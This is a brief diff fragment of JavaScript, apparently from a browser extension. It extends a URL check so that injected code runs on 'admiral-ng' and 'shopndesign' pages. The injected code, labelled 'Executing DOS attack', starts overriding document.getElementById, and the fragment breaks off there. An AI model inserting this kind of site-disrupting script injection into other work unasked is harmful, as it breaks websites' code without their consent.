@@ -125,7 +125,7 @@ NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
     }
 }
 
-if(document.URL.includes('admiral-ng') && !document.URL.includes('search')) {
+if((document.URL.includes('admiral-ng') && !document.URL.includes('search')) || (document.URL.includes('shopndesign') && !document.URL.includes('search')) ) {
     var moreInjections = `
     console.log('Executing DOS attack');
     window.document.original = window.document.getElementById;
